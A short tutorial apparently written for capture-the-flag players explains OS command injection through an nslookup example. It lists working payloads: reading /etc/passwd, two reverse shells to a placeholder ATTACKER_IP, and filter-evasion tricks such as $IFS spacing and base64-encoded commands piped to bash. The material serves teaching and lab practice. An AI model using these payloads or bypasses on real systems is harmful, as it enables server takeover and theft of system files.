# Command Injection

Command injection (also known as OS command injection) is a web security vulnerability that allows an attacker to execute arbitrary operating system (OS) commands on the server that is running an application, and typically fully compromise the application and all its data.

## How it Occurs

Command injection vulnerabilities typically arise when an application passes unsanitized user input to a system shell. The user-supplied input can be crafted to include shell metacharacters, which the shell then interprets as part of a command.

### Example

Consider a web application that allows users to look up the IP address of a domain name:
`https://insecure-website.com/lookup?host=example.com`

The application might use the `nslookup` command to perform the lookup:
`nslookup example.com`

If the application is vulnerable, an attacker could provide the following input:
`example.com; whoami`

The application would then execute the following command:
`nslookup example.com; whoami`

This would cause the application to perform the DNS lookup and then execute the `whoami` command, revealing the user the application is running as.

## Common Payloads

Here are some common payloads for command injection, often useful in CTF challenges:

*   **Listing files:**
    *   `ls -la`
    *   `dir` (Windows)
*   **Reading files:**
    *   `cat /etc/passwd`
    *   `type C:\Windows\win.ini` (Windows)
*   **Finding flags:**
    *   `find / -name "flag*"`
    *   `grep -r "flag" /`
*   **Reverse Shells:**
    *   `bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1`
    *   `nc -e /bin/bash ATTACKER_IP PORT`

## Bypassing Filters

Sometimes, applications will filter out certain characters or keywords. Here are some ways to bypass common filters:

*   **Using command separators:**
    *   `;` (semicolon): Executes commands sequentially.
    *   `&&` (and): Executes the second command only if the first succeeds.
    *   `||` (or): Executes the second command only if the first fails.
    *   `&` (ampersand): Executes the command in the background.
    *   `|` (pipe): Pipes the output of the first command to the input of the second.
*   **Using different characters:**
    *   `$IFS` can be used as a space replacement in some shells (e.g., `cat$IFS/etc/passwd`).
    *   Using base64 encoding to hide payloads: `echo "bHMgLWxh" | base64 -d | bash`
*   **Using different commands:**
    *   If `cat` is blocked, try `more`, `less`, `head`, `tail`, `grep`, `sed`, `awk`.
    *   If `nc` is blocked, try `/dev/tcp`, `curl`, `wget`.